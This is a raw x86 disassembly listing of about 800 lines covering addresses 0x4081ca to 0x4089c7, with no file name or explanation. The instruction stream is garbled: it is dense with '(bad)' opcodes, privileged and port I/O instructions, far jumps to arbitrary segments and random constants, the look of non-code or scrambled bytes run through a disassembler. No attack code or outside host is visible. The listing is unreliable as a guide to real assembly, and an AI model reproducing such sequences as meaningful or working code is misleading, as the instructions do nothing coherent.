  4081ca:	mov    edx,0xf52a3d87
  4081cf:	sub    edx,eax
  4081d1:	cmp    BYTE PTR [edi-0x68fe5245],0xd3
  4081d8:	test   al,0x1d
  4081da:	sub    BYTE PTR [ebp+0x901e50b],0x79
  4081e1:	push   ds
  4081e2:	sbb    cl,BYTE PTR [eax+0x1b174268]
  4081e8:	sub    eax,DWORD PTR [eax+0x571c2567]
  4081ee:	push   cs
  4081ef:	enter  0x6441,0x13
  4081f3:	cwde   
  4081f4:	add    al,0x39
  4081f6:	jp     0x4081fc
  4081f8:	fistp  QWORD PTR [ecx+0x331d364a]
  4081fe:	pop    ds
  4081ff:	ret    0xaf7e
  408202:	xor    esp,ebp
  408204:	addr16 sub dl,dl
  408207:	call   0x108db94a
  40820c:	jmp    DWORD PTR [edx]
  40820e:	arpl   WORD PTR [esi+0x69c6c671],sp
  408214:	mov    bh,0x14
  408216:	or     ebx,DWORD PTR [edi-0x6d79e42d]
  40821c:	dec    eax
  40821d:	xchg   ecx,eax
  40821e:	add    dl,BYTE PTR [ebx+0x5a]
  408221:	js     0x40824d
  408223:	sbb    BYTE PTR [ebx],cl
  408225:	jl     0x40824f
  408227:	jmp    0x408236
  408229:	je     0x40821d
  40822b:	cld    
  40822c:	daa    
  40822d:	add    ecx,DWORD PTR [ecx+0x23e38d68]
  408233:	bound  edi,QWORD PTR [ebx+0x27]
  408236:	add    edi,DWORD PTR [eax+0x69]
  408239:	stos   DWORD PTR es:[edi],eax
  40823a:	sub    ch,dl
  40823c:	ds xchg ecx,eax
  40823e:	fs add eax,0x2b187dd8
  408244:	scas   al,BYTE PTR es:[edi]
  408245:	and    ah,bh
  408247:	add    al,0x54
  408249:	ret    
  40824a:	and    dl,dh
  40824c:	jp     0x4081d8
  40824e:	xchg   ebx,eax
  40824f:	sbb    BYTE PTR [eax],ah
  408251:	mov    dl,0x98
  408253:	fcom   QWORD PTR [ebp+0x2e35df62]
  408259:	and    ebp,DWORD PTR [ebp+0x2e]
  40825c:	mov    eax,0x1390eb83
  408261:	adc    BYTE PTR [esi-0x6c12ece2],ah
  408267:	add    BYTE PTR [eax-0x1d],ch
  40826a:	fild   QWORD PTR [edi-0x41]
  40826d:	push   ebx
  40826e:	inc    eax
  40826f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408270:	adc    eax,esi
  408272:	call   0xf0c30739
  408277:	sbb    DWORD PTR [eax],esp
  408279:	outs   dx,DWORD PTR ds:[esi]
  40827a:	les    eax,FWORD PTR [edi+ebp*8-0x112bdd69]
  408281:	(bad)  
  408282:	pop    ebp
  408283:	inc    ebx
  408284:	jmp    0x40825d
  408286:	pop    eax
  408287:	or     eax,0xc2bc7d0e
  40828c:	fldenv [eax]
  40828e:	scas   al,BYTE PTR es:[edi]
  40828f:	mov    edx,0x3f9d93c0
  408294:	push   cs
  408295:	arpl   WORD PTR [edi-0x2cc4c25d],di
  40829b:	icebp  
  40829c:	stos   BYTE PTR es:[edi],al
  40829d:	lahf   
  40829e:	or     edx,ebx
  4082a0:	fadd   DWORD PTR [ebp+eax*1+0x45]
  4082a4:	cmp    ecx,DWORD PTR [eax]
  4082a6:	call   0xb408bc44
  4082ab:	jnp    0x408258
  4082ad:	mov    eax,0xbe7b024
  4082b2:	push   cs
  4082b3:	mov    ebx,0x27a70646
  4082b8:	push   edi
  4082b9:	mov    eax,0x5db98325
  4082be:	fs hlt 
  4082c0:	pop    eax
  4082c1:	nop
  4082c2:	mov    bl,dh
  4082c4:	not    DWORD PTR [ecx+eiz*4]
  4082c7:	loop   0x4082ef
  4082c9:	sub    esp,ecx
  4082cb:	xor    BYTE PTR ds:0x2cd6e0a0,dl
  4082d1:	inc    ebx
  4082d2:	and    DWORD PTR [edx-0x58],esi
  4082d5:	mov    edi,ecx
  4082d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082d8:	bnd fs jns 0x40829e
  4082dc:	in     al,dx
  4082dd:	or     DWORD PTR [ebx+0x20],0xee0994bd
  4082e4:	push   es
  4082e5:	repnz and eax,0xcd586d00
  4082eb:	xor    al,0x46
  4082ed:	sub    ah,BYTE PTR [ebp+0x616bd206]
  4082f3:	sub    DWORD PTR [esi+0x65b1c9f9],0x328ae396
  4082fd:	adc    al,0x9e
  4082ff:	inc    ebp
  408300:	aas    
  408301:	sti    
  408302:	xor    ebp,esi
  408304:	jb     0x4082d8
  408306:	mov    ds:0x303b35c5,al
  40830b:	mov    cs,WORD PTR [ecx]
  40830d:	ins    BYTE PTR es:[edi],dx
  40830e:	sbb    dl,dl
  408310:	mov    cl,0x3e
  408312:	jmp    0x2e14:0x5a450d74
  408319:	loope  0x408389
  40831b:	pop    ecx
  40831c:	mov    ah,0x78
  40831e:	add    DWORD PTR [ebp+0x6a7b3ba5],edx
  408324:	test   BYTE PTR [edi],bl
  408326:	add    edi,DWORD PTR [ebx+0x36]
  408329:	mov    ds:0xfdc8904d,eax
  40832e:	fwait
  40832f:	out    0x19,eax
  408331:	mov    ch,0x1e
  408333:	and    DWORD PTR ds:0xd37514b8,ebp
  408339:	cmp    cl,dh
  40833b:	stos   BYTE PTR es:[edi],al
  40833c:	or     cl,dh
  40833e:	out    dx,eax
  40833f:	(bad)  
  408340:	ds mov esi,0x534c02df
  408346:	and    ch,BYTE PTR [eax]
  408348:	jns    0x408391
  40834a:	mov    al,ds:0xaea35920
  40834f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408350:	mov    dl,0x7a
  408352:	in     al,0x6f
  408354:	sti    
  408355:	adc    BYTE PTR [ecx],al
  408357:	ret    0xad8
  40835a:	sub    dh,ah
  40835c:	xor    esp,eax
  40835e:	jnp    0x4082e7
  408360:	sbb    BYTE PTR [esi],al
  408362:	push   esp
  408363:	scas   al,BYTE PTR es:[edi]
  408364:	gs inc esp
  408366:	jecxz  0x4082fc
  408368:	dec    ebx
  408369:	xchg   ebp,eax
  40836a:	jno    0x4083ea
  40836c:	outs   dx,BYTE PTR ds:[esi]
  40836d:	scas   al,BYTE PTR es:[edi]
  40836e:	out    0x37,eax
  408370:	xor    ecx,DWORD PTR [ebx-0x2]
  408373:	mov    DWORD PTR [edx],ecx
  408375:	pop    DWORD PTR [edx-0x50]
  408378:	pop    edx
  408379:	stos   BYTE PTR es:[edi],al
  40837a:	int    0x31
  40837c:	add    ebx,DWORD PTR [ebp-0x392aa6eb]
  408382:	inc    ebp
  408383:	and    bl,BYTE PTR [esi]
  408385:	jns    0x40835b
  408387:	(bad)  
  408388:	push   esi
  408389:	mov    ah,0xda
  40838b:	cwde   
  40838c:	call   0xd8c0:0x26d13a42
  408393:	mov    edi,0x2ccfd0fa
  408398:	add    eax,0x1338e08c
  40839d:	inc    ebp
  40839e:	test   al,0x72
  4083a0:	and    dl,BYTE PTR [edx-0x8e98e72]
  4083a6:	xchg   edi,eax
  4083a7:	daa    
  4083a8:	pop    ebx
  4083a9:	mov    ah,0x32
  4083ab:	ror    BYTE PTR [ebx-0x4d44f2fc],0xe6
  4083b2:	stos   DWORD PTR es:[edi],eax
  4083b3:	stc    
  4083b4:	sub    bl,BYTE PTR [bp-0x613f]
  4083b9:	push   esp
  4083ba:	jl     0x40835a
  4083bc:	dec    ebp
  4083bd:	add    edx,esp
  4083bf:	lds    ebx,FWORD PTR [ebx+0x4517b613]
  4083c5:	into   
  4083c6:	add    eax,0x68a272b7
  4083cb:	gs mov edi,0x876fe2ad
  4083d1:	aad    0xb2
  4083d3:	push   esi
  4083d4:	mov    ch,0x6d
  4083d6:	aad    0x39
  4083d8:	mov    ah,0x3e
  4083da:	cwde   
  4083db:	xchg   esp,eax
  4083dc:	push   edi
  4083dd:	push   esp
  4083de:	xchg   ebp,eax
  4083df:	mov    bl,0x44
  4083e1:	push   ebx
  4083e2:	lock xchg edx,eax
  4083e4:	popa   
  4083e5:	push   0x72c6de65
  4083ea:	dec    esp
  4083eb:	repnz das 
  4083ed:	addr16 cli 
  4083ef:	loopne 0x408426
  4083f1:	sbb    eax,0x37238c51
  4083f6:	xor    al,0x26
  4083f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083f9:	gs dec edi
  4083fb:	sti    
  4083fc:	addr16 mov ebp,0x9eea3de7
  408402:	xlat   BYTE PTR ds:[ebx]
  408403:	out    0x9e,eax
  408405:	les    eax,FWORD PTR [ecx+0x2cefaeff]
  40840b:	or     al,0x8d
  40840d:	outs   dx,BYTE PTR ds:[esi]
  40840e:	adc    eax,0xa43cbd66
  408413:	scas   al,BYTE PTR es:[edi]
  408414:	ret    
  408415:	xchg   ebx,eax
  408416:	or     DWORD PTR [ecx-0x471ba56f],esp
  40841c:	sub    BYTE PTR [edx],ch
  40841e:	mov    edi,DWORD PTR [edx+0x45]
  408421:	pop    ebp
  408422:	xlat   BYTE PTR ds:[ebx]
  408423:	mov    ds:0x8fedf51d,eax
  408428:	mov    eax,ds:0xeaae7b93
  40842d:	xchg   ebp,eax
  40842e:	shr    BYTE PTR [esi],1
  408430:	cmp    DWORD PTR [edi+ebp*2-0x43],edi
  408434:	scas   eax,DWORD PTR es:[edi]
  408435:	leave  
  408436:	pop    es
  408437:	mov    DWORD PTR [ecx],ebp
  408439:	inc    edi
  40843a:	xor    dl,0x7f
  40843d:	out    dx,eax
  40843e:	fst    DWORD PTR [ebx+0x3d]
  408441:	push   eax
  408442:	inc    ecx
  408443:	mov    bh,BYTE PTR gs:[esi]
  408446:	imul   edx,DWORD PTR [edi+0x6c],0xffffffca
  40844a:	js     0x4083f6
  40844c:	int    0x92
  40844e:	stos   BYTE PTR es:[edi],al
  40844f:	js     0x40846e
  408451:	add    DWORD PTR [edx+0x42fb159a],ebx
  408457:	lds    eax,FWORD PTR [eax*4+0x7704fa02]
  40845e:	(bad)  
  40845f:	xchg   ecx,eax
  408460:	ds sahf 
  408462:	ja     0x9a576685
  408468:	(bad)  
  408469:	int    0x65
  40846b:	out    0xe,eax
  40846d:	sbb    eax,0x46caca28
  408472:	mov    ah,0x5
  408474:	mov    bl,0xdd
  408476:	push   esi
  408477:	aaa    
  408478:	mov    ds:0x4a1c57a0,eax
  40847d:	inc    edi
  40847e:	aaa    
  40847f:	icebp  
  408480:	test   DWORD PTR [edx-0x3ad8d8a1],esp
  408486:	out    dx,al
  408487:	(bad)  
  408488:	push   ds
  408489:	daa    
  40848a:	push   cs
  40848b:	cmp    cl,BYTE PTR ds:0x852d0dac
  408491:	sbb    edx,ebx
  408493:	xor    eax,0x63621435
  408498:	sbb    ah,BYTE PTR [ecx-0x72]
  40849b:	(bad)  
  40849c:	jle    0x408444
  40849e:	call   0xe0a5:0x8612be1f
  4084a5:	loopne 0x408469
  4084a7:	sbb    eax,0xf98c4115
  4084ac:	rcr    BYTE PTR ds:0x316c1af6,0xb7
  4084b3:	sbb    ebx,DWORD PTR [ecx-0x1ead8ad2]
  4084b9:	loope  0x4084ea
  4084bb:	outs   dx,BYTE PTR ds:[esi]
  4084bc:	scas   eax,DWORD PTR es:[edi]
  4084bd:	shr    BYTE PTR [eax],cl
  4084bf:	push   edx
  4084c0:	ror    BYTE PTR [esp+eax*1-0xb473318],0x6c
  4084c8:	pop    edi
  4084c9:	adc    al,0xa5
  4084cb:	adc    eax,ebx
  4084cd:	push   ebx
  4084ce:	xor    al,0x74
  4084d0:	jmp    0x5b54:0xb0ae0a60
  4084d7:	dec    ebp
  4084d8:	mov    ecx,0xf31eb802
  4084dd:	int    0xbe
  4084df:	popf   
  4084e0:	dec    ecx
  4084e1:	adc    ecx,DWORD PTR ss:[ebx-0x31]
  4084e5:	adc    esi,DWORD PTR [esi-0x4e98da44]
  4084eb:	ins    DWORD PTR es:[edi],dx
  4084ec:	or     al,0xdf
  4084ee:	(bad)  
  4084ef:	xor    al,BYTE PTR ds:0x67a7aa8d
  4084f5:	out    0xf3,al
  4084f7:	mov    dl,0x7d
  4084f9:	cmp    DWORD PTR [ecx+ebp*8],ecx
  4084fc:	xchg   BYTE PTR [edi],bl
  4084fe:	xchg   esi,eax
  4084ff:	pop    ebx
  408500:	lahf   
  408501:	cmp    BYTE PTR [edx-0x2c],0x87
  408505:	or     edi,DWORD PTR [edx]
  408507:	cli    
  408508:	daa    
  408509:	imul   edi,DWORD PTR [ebx],0x3c4baec6
  40850f:	jo     0x40851f
  408511:	outs   dx,DWORD PTR ds:[esi]
  408512:	jl     0x40852b
  408514:	xor    eax,0x278383a2
  408519:	fwait
  40851a:	jle    0x4084ce
  40851c:	mov    eax,0x76413567
  408521:	imul   ecx,DWORD PTR [eax-0x25be4e2f],0x1
  408528:	add    BYTE PTR [esi],dh
  40852a:	nop
  40852b:	inc    ebx
  40852c:	repz enter 0x4a0b,0x34
  408531:	jl     0x4084cc
  408533:	and    eax,0x72243378
  408538:	mov    ebx,eax
  40853a:	sub    esi,0xdfe5fbb7
  408540:	jbe    0x408590
  408542:	aas    
  408543:	push   ebp
  408544:	lahf   
  408545:	shr    DWORD PTR [edi],1
  408547:	add    DWORD PTR [edx-0x18],0x3e
  40854b:	push   0xffffffbd
  40854d:	outs   dx,DWORD PTR ds:[esi]
  40854e:	call   0x4524:0xd4380d08
  408555:	xchg   edi,eax
  408556:	(bad)  
  408557:	adc    al,0x35
  408559:	push   esp
  40855a:	jmp    0x4084f4
  40855c:	mov    edx,0xb8c0ea99
  408561:	es ds aaa 
  408564:	mov    esp,0x90d852f0
  408569:	pop    ecx
  40856a:	xor    BYTE PTR [eax-0x56],ch
  40856d:	sub    DWORD PTR [esp+edi*1],edx
  408570:	aas    
  408571:	ds push eax
  408573:	jnp    0x408580
  408575:	mov    bl,0x4c
  408577:	enter  0xf59f,0xf5
  40857b:	fild   WORD PTR [eax-0x4bc915a2]
  408581:	cmp    edx,ebp
  408583:	or     dl,BYTE PTR [edx+0x340500ce]
  408589:	rcr    DWORD PTR [eax+0x31268cfe],cl
  40858f:	dec    esi
  408590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408591:	cmc    
  408592:	sti    
  408593:	sbb    ebx,ecx
  408595:	hlt    
  408596:	xchg   ebx,eax
  408597:	call   0xfaaa:0x14b82d19
  40859e:	xor    BYTE PTR [edx],bl
  4085a0:	jp     0x4085c6
  4085a2:	in     al,dx
  4085a3:	cdq    
  4085a4:	shl    DWORD PTR [ecx+0x27],0x2f
  4085a8:	jp     0x40854f
  4085aa:	cmp    edi,DWORD PTR [ecx]
  4085ac:	into   
  4085ad:	sbb    DWORD PTR [esi-0x57fc477f],0x500d495b
  4085b7:	out    0x3e,eax
  4085b9:	push   ds
  4085ba:	hlt    
  4085bb:	outs   dx,BYTE PTR ds:[esi]
  4085bc:	imul   edx,DWORD PTR [edi-0x7],0xeb1d6426
  4085c3:	pusha  
  4085c4:	jmp    0x408574
  4085c6:	push   es
  4085c7:	pop    ss
  4085c8:	gs sub al,0xd1
  4085cb:	lods   eax,DWORD PTR ds:[esi]
  4085cc:	shr    DWORD PTR [edi-0x43],cl
  4085cf:	test   dh,dl
  4085d1:	mov    ebx,DWORD PTR [ebx]
  4085d3:	mov    esp,0x19a96508
  4085d8:	mov    edi,ebp
  4085da:	sub    DWORD PTR [eax-0x1a],edx
  4085dd:	ds ret 
  4085df:	into   
  4085e0:	cmp    al,0x51
  4085e2:	inc    esi
  4085e3:	pop    ecx
  4085e4:	cdq    
  4085e5:	adc    BYTE PTR [esi-0x3b],al
  4085e8:	or     esi,DWORD PTR [ebp-0x77]
  4085eb:	stos   DWORD PTR es:[edi],eax
  4085ec:	rol    BYTE PTR [edx+0x5f25b7c6],0x6c
  4085f3:	sub    DWORD PTR [ecx],ebx
  4085f5:	dec    ecx
  4085f6:	pop    edx
  4085f7:	push   edx
  4085f8:	cmc    
  4085f9:	leave  
  4085fa:	mov    edx,0xc79d8c30
  4085ff:	into   
  408600:	ins    BYTE PTR es:[edi],dx
  408601:	dec    edi
  408602:	xchg   ecx,eax
  408603:	mov    dl,0xca
  408605:	or     eax,0xc29a583d
  40860a:	pop    esp
  40860b:	sub    eax,0x3172d2b5
  408610:	lock push es
  408612:	mov    dh,0xad
  408614:	hlt    
  408615:	add    eax,0xe79b08fc
  40861a:	push   es
  40861b:	xchg   DWORD PTR [eax-0xd4f8f15],edi
  408621:	shl    DWORD PTR [edi+0x30a58ae8],1
  408627:	xchg   esp,eax
  408628:	jmp    DWORD PTR [ecx+ebp*2+0x2b]
  40862c:	fild   DWORD PTR [edi+eax*1+0x62a74d5e]
  408633:	cmp    ah,bl
  408635:	add    DWORD PTR [ebp+0x23fd089],0xf8e0c7f1
  40863f:	sbb    esp,0xffffffe6
  408642:	pmuludq mm6,QWORD PTR [ebx]
  408645:	push   edx
  408646:	jne    0x408696
  408648:	cmp    al,0xe5
  40864a:	aas    
  40864b:	pop    es
  40864c:	adc    al,0x79
  40864e:	push   0xffffff96
  408650:	jecxz  0x4086ab
  408652:	dec    ebx
  408653:	ds stos DWORD PTR es:[edi],eax
  408655:	loopne 0x4085fc
  408657:	fcomp  st(1)
  408659:	lock cwde 
  40865b:	dec    esp
  40865c:	and    eax,0x5432a43a
  408661:	and    al,0x42
  408663:	jmp    0x384:0x7ce67e6f
  40866a:	lea    edi,[ecx]
  40866c:	dec    ebx
  40866d:	jecxz  0x408668
  40866f:	test   bh,bl
  408671:	or     ah,bh
  408673:	lahf   
  408674:	ins    DWORD PTR es:[edi],dx
  408675:	xor    eax,0x888ec838
  40867a:	mov    edi,0x2fe5856a
  40867f:	ja     0x4086a2
  408681:	jle    0x408616
  408683:	xor    BYTE PTR [edx],ah
  408685:	scas   al,BYTE PTR es:[edi]
  408686:	xor    BYTE PTR [edi+edx*2+0x14b8775b],0x20
  40868e:	adc    DWORD PTR [edx+0x10],ebp
  408691:	xchg   BYTE PTR [edi],cl
  408693:	fst    DWORD PTR [ecx+0x68f155ab]
  408699:	adc    DWORD PTR [esi],edx
  40869b:	into   
  40869c:	aaa    
  40869d:	es es pop esi
  4086a0:	mov    cs,WORD PTR [esi+0x4a]
  4086a3:	sbb    ebx,esi
  4086a5:	clc    
  4086a6:	pop    es
  4086a7:	cmp    DWORD PTR [ecx],0x8b51ce03
  4086ad:	pop    ds
  4086ae:	jp     0x408678
  4086b0:	inc    esi
  4086b1:	mov    eax,DWORD PTR [ecx+0x77c59591]
  4086b7:	xchg   esp,eax
  4086b8:	hlt    
  4086b9:	jecxz  0x4086b8
  4086bb:	push   ecx
  4086bc:	jnp    0x40865d
  4086be:	xlat   BYTE PTR ds:[ebx]
  4086bf:	sub    eax,0x571987ad
  4086c4:	sbb    al,ch
  4086c6:	enter  0x29de,0x2d
  4086ca:	call   0xc78b:0xc524c592
  4086d1:	lock xor edi,DWORD PTR [eax]
  4086d4:	xchg   edx,eax
  4086d5:	fs iret 
  4086d7:	sbb    esp,DWORD PTR [esi*4+0x62f8e993]
  4086de:	inc    eax
  4086df:	inc    ebp
  4086e0:	fabs   
  4086e2:	sbb    BYTE PTR [edi+0x11ff7429],al
  4086e8:	daa    
  4086e9:	sbb    eax,0xc268e8c2
  4086ee:	ds movd mm7,ecx
  4086f2:	clc    
  4086f3:	mov    eax,DWORD PTR [edx+0x2a]
  4086f6:	loope  0x40869a
  4086f8:	xchg   edx,eax
  4086f9:	inc    ecx
  4086fa:	or     BYTE PTR [esi],cl
  4086fc:	aam    0xc2
  4086fe:	lods   al,BYTE PTR ds:[esi]
  4086ff:	xor    eax,0xffa1f47d
  408704:	adc    BYTE PTR [eax],dl
  408706:	xchg   edx,eax
  408707:	xor    al,0x34
  408709:	xor    al,BYTE PTR [ebx-0x53]
  40870c:	xor    eax,ebp
  40870e:	xor    ebp,ebx
  408710:	es aad 0x3f
  408713:	mov    al,0x90
  408715:	(bad)
  408719:	xor    eax,DWORD PTR [eax-0x5f]
  40871c:	push   ecx
  40871d:	xor    ecx,DWORD PTR [eax-0x20f04b4d]
  408723:	iret   
  408724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408725:	stc    
  408726:	inc    ebx
  408727:	pusha  
  408728:	out    dx,eax
  408729:	add    al,0x66
  40872b:	and    DWORD PTR [edx-0x26],0xf30d0e1f
  408732:	test   DWORD PTR [esi-0x217e6290],ebx
  408738:	cmc    
  408739:	xchg   esi,eax
  40873a:	call   0xbe51:0xbb9c07d0
  408741:	add    al,0xcf
  408743:	fimul  WORD PTR [eax-0x48]
  408746:	adc    al,0x80
  408748:	das    
  408749:	cli    
  40874a:	mov    edi,0x34e5735
  40874f:	and    eax,DWORD PTR [ecx-0x22698e44]
  408755:	je     0x408766
  408757:	inc    ebp
  408758:	mov    ds:0xa16f045c,al
  40875d:	push   edx
  40875e:	xor    dl,BYTE PTR [eax-0x6184a170]
  408764:	push   eax
  408765:	pop    esi
  408766:	mov    bh,0x53
  408768:	inc    eax
  408769:	and    ebp,DWORD PTR [esi*2+0x226b5e63]
  408770:	lea    esi,[ecx]
  408772:	daa    
  408773:	and    al,0xce
  408775:	fcmovu st,st(3)
  408777:	push   edx
  408778:	in     al,dx
  408779:	pop    ecx
  40877a:	mov    ebp,0x87ae5ed
  40877f:	jmp    0xfee9:0x572a4ec8
  408786:	and    edx,0x3d
  408789:	pop    ecx
  40878a:	outs   dx,BYTE PTR ds:[esi]
  40878b:	push   esi
  40878c:	sub    eax,0x825bcd16
  408791:	mov    esi,0x55e6d9d
  408796:	cmp    DWORD PTR [esi-0x3c],edx
  408799:	sub    eax,0xcbfd56e
  40879e:	js     0x4087c9
  4087a0:	or     esi,DWORD PTR [edx+0x56]
  4087a3:	sbb    bl,cl
  4087a5:	dec    edi
  4087a6:	and    edx,ebp
  4087a8:	call   0x9eb05134
  4087ad:	(bad)  [ebp+0x31]
  4087b0:	xchg   cl,bh
  4087b2:	jmp    DWORD PTR [ecx+0x26ece88c]
  4087b8:	daa    
  4087b9:	inc    esi
  4087ba:	inc    ecx
  4087bb:	ret    
  4087bc:	cmp    cl,0x46
  4087bf:	(bad)  
  4087c0:	mov    bl,0x8a
  4087c2:	lds    edx,FWORD PTR [ecx]
  4087c4:	xor    eax,0x6318926b
  4087c9:	fadd   QWORD PTR [esi+0x2d]
  4087cc:	fisubr DWORD PTR [ebx]
  4087ce:	add    eax,0x37bdb1e0
  4087d3:	and    bl,ah
  4087d5:	push   es
  4087d6:	jno    0x408814
  4087d8:	jmp    0xaa5b:0x28082693
  4087df:	xchg   esp,eax
  4087e0:	popf   
  4087e1:	(bad)
  4087e4:	ffreep st(4)
  4087e6:	adc    edx,DWORD PTR ds:0x224bf2f
  4087ec:	(bad)  
  4087ed:	imul   DWORD PTR [ecx-0x30]
  4087f0:	dec    edx
  4087f1:	fmulp  st(1),st
  4087f3:	shl    al,1
  4087f5:	mov    BYTE PTR [ebx-0x3e],al
  4087f8:	cwde   
  4087f9:	push   0x9d248604
  4087fe:	je     0x40878d
  408800:	out    0x49,eax
  408802:	cs cli 
  408804:	adc    eax,DWORD PTR [edi-0x2f]
  408807:	push   cs
  408808:	jl     0x40884f
  40880a:	pop    ss
  40880b:	xchg   esp,eax
  40880c:	call   0xc0f9:0x5d9a7f7a
  408813:	jecxz  0x4087bf
  408815:	mov    ebp,0xeef4e90
  40881a:	inc    ebp
  40881b:	daa    
  40881c:	mov    esp,0xaaec40f1
  408821:	mov    eax,0xf927ddb5
  408826:	xor    BYTE PTR [ebp+0x40],bl
  408829:	(bad)  
  40882a:	xor    dh,dl
  40882c:	fisub  DWORD PTR [edx-0x24]
  40882f:	std    
  408830:	push   ss
  408831:	test   al,0xdb
  408833:	mov    WORD PTR [edi-0x7b29a143],?
  408839:	(bad)  
  40883a:	shl    BYTE PTR [ecx-0x5c4b0266],cl
  408840:	mov    dh,0xb2
  408842:	xor    DWORD PTR [ebx+0x357c4ddc],ebp
  408848:	dec    edi
  408849:	fadd   st(1),st
  40884b:	mov    esi,DWORD PTR [ecx]
  40884d:	mov    edx,0xa6c6da32
  408852:	pop    ebx
  408853:	in     eax,0x80
  408855:	dec    eax
  408856:	mov    ah,ch
  408858:	icebp  
  408859:	push   es
  40885a:	push   esi
  40885b:	adc    ecx,DWORD PTR [esi-0x23]
  40885e:	sub    dl,BYTE PTR [edi]
  408860:	in     al,dx
  408861:	jmp    0x40882b
  408863:	lock pop esp
  408865:	mov    al,0xa6
  408867:	fmul   QWORD PTR [edi+edi*2-0x19d32c73]
  40886e:	loope  0x4088bf
  408870:	stc    
  408871:	lahf   
  408872:	push   edx
  408873:	lock and al,0x65
  408876:	test   eax,0x71efbcdc
  40887b:	or     al,0xac
  40887d:	and    BYTE PTR [edi+0x3d],dl
  408880:	pop    ecx
  408881:	loopne 0x408890
  408883:	mov    bh,0xfa
  408885:	sub    al,0x24
  408887:	push   ecx
  408888:	mov    ecx,0x9c79d55
  40888d:	cmp    eax,eax
  40888f:	(bad)  
  408890:	adc    eax,DWORD PTR [edi]
  408892:	xchg   ebp,eax
  408893:	dec    esp
  408894:	aaa    
  408895:	xchg   ecx,eax
  408896:	mov    WORD PTR [ebx+esi*1+0x22947d6],?
  40889d:	out    0xc7,al
  40889f:	(bad)
  4088a2:	test   eax,0xd12844c2
  4088a7:	cld    
  4088a8:	fld    TBYTE PTR [ebx-0x5cd7968b]
  4088ae:	pop    edx
  4088af:	scas   al,BYTE PTR es:[edi]
  4088b0:	xchg   dh,dh
  4088b2:	sbb    dh,BYTE PTR [ecx+0x219a672e]
  4088b8:	adc    DWORD PTR [edx],0x50
  4088bb:	ret    0x6138
  4088be:	mov    al,ds:0xe5cd745e
  4088c3:	fisubr DWORD PTR [ecx-0x4c]
  4088c6:	inc    eax
  4088c7:	push   cs
  4088c8:	outs   dx,DWORD PTR ds:[esi]
  4088c9:	les    esp,FWORD PTR [ecx+0x5d]
  4088cc:	mov    edi,0x654a9617
  4088d1:	pop    ds
  4088d2:	push   ebp
  4088d3:	push   esi
  4088d4:	push   ebp
  4088d5:	mov    ebp,0x4907873d
  4088da:	mov    WORD PTR [edx+0x39],gs
  4088dd:	sti    
  4088de:	xchg   ecx,eax
  4088df:	nop/reserved BYTE PTR [ecx]
  4088e2:	loope  0x4088ea
  4088e4:	aad    0x21
  4088e6:	(bad)  
  4088e7:	sti    
  4088e8:	mov    ss,WORD PTR [eax]
  4088ea:	fs das 
  4088ec:	dec    edi
  4088ed:	xchg   ebx,esi
  4088ef:	pushf  
  4088f0:	iret   
  4088f1:	mov    cl,0xc9
  4088f3:	xchg   esi,eax
  4088f4:	mov    ch,0x37
  4088f6:	xchg   ebx,eax
  4088f7:	lea    edx,[ebp+eax*2-0x2e4f1857]
  4088fe:	test   eax,0xf3e9a52c
  408903:	jge    0x3c024fd3
  408909:	pop    ebp
  40890a:	sub    eax,edx
  40890c:	xchg   ebp,eax
  40890d:	add    edi,edx
  40890f:	test   BYTE PTR [esi+0x6a],bl
  408912:	std    
  408913:	xchg   ebx,eax
  408914:	push   ss
  408915:	xor    ch,ah
  408917:	loope  0x4088bd
  408919:	xchg   edx,eax
  40891a:	xor    al,0xb7
  40891c:	ds jo  0x4088e3
  40891f:	xchg   esi,eax
  408920:	mov    bl,0xfe
  408922:	cmp    eax,0xa17fb8ac
  408927:	mov    ds:0xb63af134,eax
  40892c:	cmp    dl,dh
  40892e:	popf   
  40892f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408930:	pop    edx
  408931:	aad    0x56
  408933:	retf   
  408934:	leave  
  408935:	gs ins BYTE PTR es:[edi],dx
  408937:	cmp    ebp,DWORD PTR [ebx+0xa]
  40893a:	retf   
  40893b:	mov    eax,0xd09f08fd
  408940:	or     esi,DWORD PTR [edx-0x7e]
  408943:	push   cs
  408944:	iret   
  408945:	jle    0x4088e3
  408947:	shl    BYTE PTR [eax],1
  408949:	inc    esi
  40894a:	mov    bl,0x47
  40894c:	push   ebp
  40894d:	inc    esi
  40894e:	pusha  
  40894f:	fisub  DWORD PTR [ecx]
  408951:	clc    
  408952:	cmp    DWORD PTR [edx],edi
  408954:	add    ah,BYTE PTR [ebx-0xe]
  408957:	xlat   BYTE PTR ds:[ebx]
  408958:	sub    esi,DWORD PTR [ebx+edx*8-0x578ad30d]
  40895f:	xor    al,0xee
  408961:	add    eax,0xa1922c6c
  408966:	imul   ecx,DWORD PTR [esi+0x4c],0x69335be1
  40896d:	adc    edi,eax
  40896f:	mov    WORD PTR [ecx+0x5a],?
  408972:	push   ebx
  408973:	jns    0x4089cb
  408975:	or     al,0xcc
  408977:	inc    eax
  408978:	and    bl,cl
  40897a:	push   es
  40897b:	ins    DWORD PTR es:[edi],dx
  40897c:	pop    eax
  40897d:	xchg   edx,eax
  40897e:	cmp    edx,DWORD PTR [ebp+0x41]
  408981:	lods   eax,DWORD PTR ds:[esi]
  408982:	or     al,0x59
  408984:	and    dh,BYTE PTR [ecx-0x7f839887]
  40898a:	pop    ecx
  40898b:	mov    eax,ds:0x7a8e0ae1
  408990:	sub    BYTE PTR [esi],0x53
  408993:	cwde   
  408994:	aas    
  408995:	test   eax,0x98ef19af
  40899a:	adc    BYTE PTR [esi-0x6f],dl
  40899d:	pop    edi
  40899e:	cmp    esp,DWORD PTR [edi+0x795c1a33]
  4089a4:	fadd   QWORD PTR [esi-0x1271fe7d]
  4089aa:	sub    DWORD PTR [ebp+0x28],ebx
  4089ad:	mov    WORD PTR [edi],fs
  4089af:	cs mov edi,0xf09520dc
  4089b5:	jmp    DWORD PTR [esi]
  4089b7:	cmp    edi,esi
  4089b9:	and    eax,ebx
  4089bb:	outs   dx,BYTE PTR ds:[esi]
  4089bc:	pop    ss
  4089bd:	xchg   ebp,eax
  4089be:	push   ebp
  4089bf:	loopne 0x40894f
  4089c1:	cmp    ebx,DWORD PTR [ecx-0x42833f9b]
  4089c7:	retf   
